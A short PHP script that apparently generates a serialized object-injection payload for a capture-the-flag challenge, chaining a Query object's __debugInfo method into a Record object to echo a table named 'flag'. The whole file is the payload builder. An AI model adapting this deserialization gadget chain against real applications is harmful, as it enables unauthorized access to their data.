<?php

class Record
{
    private $host;
    private $user;
    private $pass;
    private $db;
    private $tb;
    private $conn;

    public function __construct(string $host, string $user, string $pass, string $db, string $tb)
    {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->db = $db;
        $this->tb = $tb;
    }

    public function getAllRecords()
    {
      echo $this->tb;
    }
}

class Query
{
    private $store;

    public function __construct($store)
    {
        $this->store = $store;
    }

    public function getAllQuery()
    {
        return $this->store->getAllRecords();
    }

    public function __debugInfo()
    {
        return $this->getAllQuery();
    }
}

print_r(serialize(new Query(new Record("mysql", "val0id", "kaboom", "serial_killer", "flag"))));
?>